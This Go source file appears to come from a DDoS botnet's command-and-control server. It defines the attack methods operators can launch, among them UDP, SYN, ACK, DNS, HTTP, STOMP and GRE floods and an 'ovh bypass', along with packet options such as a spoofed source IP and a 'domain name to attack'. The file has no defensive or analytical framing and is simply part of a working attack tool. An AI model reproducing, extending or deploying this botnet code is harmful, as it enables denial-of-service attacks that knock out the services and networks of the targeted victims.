package main

import "reflect"

// Method handles the controller for each method
type Method struct {
	ID			uint8
	Flags		[]uint8
	Description string
}

// Flag handles the controller for each different flag
type Flag struct {
	ID			uint8
	Description string
	Type	 	reflect.Kind
	Maximum		int
	Minimum 	int
	Default     interface{}
	HasDefault  bool
}

// Holds all the valid flags available
var Flags map[string]Flag = map[string]Flag{
    "len": {
        ID: 		 0,
        Description: "Size of packet data, default is 512 bytes",
		Type: reflect.Int,
		Maximum: 1460,
		Default: 300,
		Minimum: 1,
		HasDefault: true,
    },
    "rand": {
        ID: 		 1,
        Description: "Randomize packet data content, default is 1 (yes)",
    },
    "tos": {
        ID: 		 2,
        Description: "TOS field value in IP header, default is 0",
    },
    "ident": {
        ID: 		 3,
        Description: "ID field value in IP header, default is random",
    },
    "ttl": {
        ID: 		 4,
        Description: "TTL field in IP header, default is 255",
    },
    "df": {
        ID: 		 5,
        Description: "Set the Dont-Fragment bit in IP header, default is 0 (no)",
    },
    "sport": {
        ID: 		 6,
        Description: "Source port, default is random",
		Type: reflect.Int,
		Maximum: 65535,
		Minimum: 1,
        Default: 80,
		HasDefault: true,
    },
    "dport": {
        ID: 		 7,
        Description: "Destination port, default is random",
		Type: reflect.Int,
		Maximum: 65535,
		Default: 80,
		Minimum: 1,
		HasDefault: true,
    },
    "domain": {
        ID: 		 8,
        Description: "Domain name to attack",
    },
    "dhid": {
        ID: 		 9,
        Description: "Domain name transaction ID, default is random",
    },
    "urg": {
        ID: 		 11,
        Description: "Set the URG bit in IP header, default is 0 (no)",
    },
    "ack": {
        ID: 		 12,
        Description: "Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
    },
    "psh": {
        ID: 		 13,
        Description: "Set the PSH bit in IP header, default is 0 (no)",
    },
    "rst": {
        ID: 		 14,
        Description: "Set the RST bit in IP header, default is 0 (no)",
    },
    "syn": {
        ID: 		 15,
        Description: "Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
    },
    "fin": {
        ID: 		 16,
        Description: "Set the FIN bit in IP header, default is 0 (no)",
    },
    "seqnum": {
        ID: 		 17,
        Description: "Sequence number value in TCP header, default is random",
    },
    "acknum": {
        ID: 		 18,
        Description: "Ack number value in TCP header, default is random",
    },
    "gcip": {
        ID: 		 19,
        Description: "Set internal IP to destination ip, default is 0 (no)",
    },
    "method": {
        ID: 		 20,
        Description: "HTTP method name, default is get",
    },
    "postdata": {
        ID: 		 21,
        Description: "POST data, default is empty/none",
    },
    "path": {
        ID: 		 22,
        Description: "HTTP path, default is /",
    },
    "conns": {
        ID: 		 24,
        Description: "Number of connections",
    },
    "source": {
        ID: 		 25,
        Description: "Source IP address, 255.255.255.255 for random",
    },
    "randlen": {
        ID: 		 26,
        Description: "Random length",
    },
}

// Holds all the methods which are valid
var Methods map[string]*Method = map[string]*Method{
	".udp": {
		ID: 0,
		Flags: []uint8 {2, 3, 4, 0, 1, 5, 6, 7, 25},
		Description: "udpflood (designed for high gbps)",
	},

	".vse": {
		ID: 1,
		Flags: []uint8{2,3,4,5,6,7},
		Description: "Value source specificly designed flood",
	},

	".dns": {
		ID: 2,
		Flags: []uint8 { 2, 3, 4, 5, 6, 7, 8, 9 },
		Description: "DNS Flood",
	},

	".syn": {
		ID: 3,
		Flags: []uint8{ 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
		Description: "tcp synflood",
	},

	".ack": {
		ID: 4,
		Flags: []uint8{ 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
		Description: "tcp ack flood",
	},

	".stomp": {
		ID: 5,
		Flags: []uint8{ 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
		Description: "stomp flood",
	},

	".ovh": {
		ID: 6,
		Flags: []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
		Description: "ovh bypass",
	},

	".greeth": {
        ID: 7,
		Flags: []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
		Description: "greeth flood",
	},

	".udpplain": {
		ID: 9,
		Flags: []uint8 {0, 1, 7},
		Description: "udp plain flood",
	},

	".http": {
		ID: 10,
		Flags: []uint8{8, 7, 20, 21, 22, 24},
		Description: "http flood",
	},
}

// MethodsFromMapToArray will take all the methods from the map and convert into an array
func MethodsFromMapToArray(src []string) []string {
	for key := range Methods {
		src = append(src, key)
	}

	return src
}